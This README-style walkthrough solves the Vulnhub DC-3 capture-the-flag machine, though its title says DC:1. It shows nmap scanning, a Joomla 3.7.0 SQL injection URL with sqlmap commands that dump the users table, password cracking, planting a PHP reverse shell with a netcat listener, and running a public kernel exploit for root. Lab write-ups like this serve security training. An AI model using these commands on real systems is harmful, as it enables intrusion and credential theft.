# DC:1 CTF Walkthrough (Vulnhub) 

###### <p align="center"> *This is official repository maintained by me*</center> </p>
###### <p align="center"> *[yigitdrbk](https://www.instagram.com/yigitdrbk/) *</center> </p>

Dc:3 is a CTF created by DCAU. You can find the technical information about this CTF on the Vulnhub page. First of all, make sure to download and install the correct OVA file from Vulnhub. (https://download.vulnhub.com/dc/DC-3-2.zip).

As mentioned in the description on the Vulnhub page, it is similar to beginner CTFs, but it requires knowledge of Linux and penetration testing tools like sqlmap , netcat and nmap.

## 1-Recon
After setting your machine’s IP to work on your network, you’re ready to scan. If you can’t reach your machine from another virtual machine or your own computer, you should check your VirtualBox network settings. If you’re trying to reach your machine from another VirtualBox instance, both machines’ network settings should be set to Bridged Adapter or NAT Network. Once that’s configured, you’re ready to start scanning.

To find an IP address on the same network, we can use Nmap or Netdiscover to scan.

```bash
nmap -sn 10.0.2.0/24 or netdiscover -r 10.0.2.0/24
```

![DC3](https://miro.medium.com/v2/resize:fit:828/format:webp/1*kGwQw0OZ-z3KaE0qCHMbYg.png "DC3")

If you are not sure if this is Ctf machine ip or your ip , just run ifconfig. I make sure this is my ip now I can scan ports, search for directories, view the source page, etc. I started with Nmap, but you can also use Rustscan to quickly find open ports.

```bash
nmap -p- -vv <Machine-Ip> -oN openports
```

Also i checked source code but there was nothing important. After finding the open ports, I performed a script scan and a version scan. Additionally, scanning for vulnerabilities is important at this stage.

```bash
nmap -PN -sS -sV --script vuln -p 80 <Machine-Ip> -oN finalscan
```
![DC3](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*sxzrOCgpZUy2-SUi57b19w.png "DC3")

Only port 80 is running an Apache HTTPD 2.4.18 server. During my scan, I found some suspicious folders, so there was no need to use tools like Dirsearch or Dirb

Importantly, I discovered a Cve related to an SQL injection vulnerability in this Joomla version(3.7.0). Joomla is a Cms, similar to WordPress or Drupal.

Since Drupal was on DC:1, I had some prior knowledge of CMS platforms.

Afterward, I visited the website, where there was only one note.

![DC3](https://miro.medium.com/v2/resize:fit:828/format:webp/0*DltvuQgyCsY71V3Z.png "DC3")

I tried the admin directory I found in the Nmap script scan. The administrator directory also had a login panel. Since I knew about the SQL injection vulnerability, I used SQLmap.

## 2- Exploitation

First, I tried msfconsole and searched for Joomla 3.7.0. There was an exploit available, but it didn’t work for some reason. Next, I searched for Joomla 3.7.0 on searchsploit and found the vulnerable URL. I replaced localhost with my CTF machine’s IP address.

![DC3](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*dPWMC75jkVxW4taJ1GIKXQ.png "DC3")

```bash
http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
```
The -m parameter in Searchsploit copies the exploit’s text file to your directory. After I found the vulnerable URL and modified it, I tried to run SQLmap. Since I wasn’t familiar with SQLmap, I did some research and discovered that I needed to find the table names first, which I would use later.

```bash
sqlmap -u "http://10.0.2.12/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
The above command’s result gave me 6 table name.

```bash
Table: #__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| name     | non-numeric |
| email    | non-numeric |
| id       | numeric     |
| params   | non-numeric |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+
```
Then, I tried to exploit the #__users table using SQLmap. My goal was to gather the users and their passwords with the command below:

```bash
sqlmap -u "http://10.0.2.12/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb -T '#__users' -C name,password --dump
```
![DC3](https://miro.medium.com/v2/resize:fit:828/format:webp/1*qInxXcDo6B764ba-luSqJA.png "DC3")

Now I have admin hash. I cracked with john. It’s too easy to do. Just write your hash into a file and run the “ john <file>” command. As below :

![DC3](https://miro.medium.com/v2/resize:fit:828/format:webp/1*q8EwThdf3juKA-_jsyXkRw.png "DC3")

With the password snoopy, I tried to log in to the administrator directory. I successfully accessed the admin panel of the CMS.

I edited the index.php file from the templates page, which was a bit challenging to find. I copied the entire index.php code from the website and replaced it with a PHP reverse shell. The PHP reverse shell can be found in the /usr/share/webshells/php directory. If you can’t find it on your machine or if you’re not using Kali, you can simply search for it on the internet.

Don’t forget to modify your payload; your IP and port must be correct. I started a netcat session with rlwrap so I could use my previous commands.

![DC3](https://miro.medium.com/v2/resize:fit:828/format:webp/1*G21jHVvANo257faztUmS1g.png "DC3")

```bash
rlwrap nc -lvnp 1234
```
I used curl command to run index.php file but it was not necessary , you can just visit the page on browser.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
Basic shell commands to get a more proper shell. And now it’s time to privilege our escalations.

## 3- Privilege escalation

There was nothing on the machine to privilege escalation so i checked what am i using.

![DC3](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZbOzp_aNOtfc14UXzgF0Nw.png "DC3")

I was using the outdated version of Ubuntu. With some quick resarch on searchsploit i found the report.


![DC3](https://miro.medium.com/v2/resize:fit:828/format:webp/1*aIoqKw6Cb5tU9GizFQ-8zA.png "DC3")

“Searchsploit -m linux/local/39772.txt “ located report to my current directory. But this was just a report thing not a payload. But there was links to payload so i tried to git first.

![DC3](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*VY4s4XUL_tuGal5KOCeugg.png "DC3")

Exploit-DB Mirror: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip

However, the Git link was just a report as well. I tried to use the zip link and downloaded it to my computer. I hosted my computer using the command php -S <myip>:8000 so I could access this zip file through the www-data shell. However, I couldn't access it due to permissions and restrictions. I then attempted to download the zip file directly to the CTF machine, but that didn’t work either.

I noticed the /var/tmp directory, which is a globally writable directory, so I could download my zip file there. I used the following command:

```bash
git clone <above exploit-db link>
```

And i have zip file downloaded. I extracted it and used.

```bash
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
```

And there was the exploit files.

![DC3](https://miro.medium.com/v2/resize:fit:294/format:webp/1*t4cv4eCjc4UCyHDcVx1fEw.png "DC3")

I run the compile.sh file and then run the doubleput file.

![DC3](https://miro.medium.com/v2/resize:fit:828/format:webp/1*VsyJvE0KOvf4CJykZWr_oQ.png "DC3")

And now I am root so I can cd to root directory and read the flag.

![DC3](https://miro.medium.com/v2/resize:fit:828/format:webp/1*4zqOZ9xigkGWxebWyqR7dw.png "DC3")

Developer / Author: [yigitdrbk](https://www.instagram.com/yigitdrbk/)
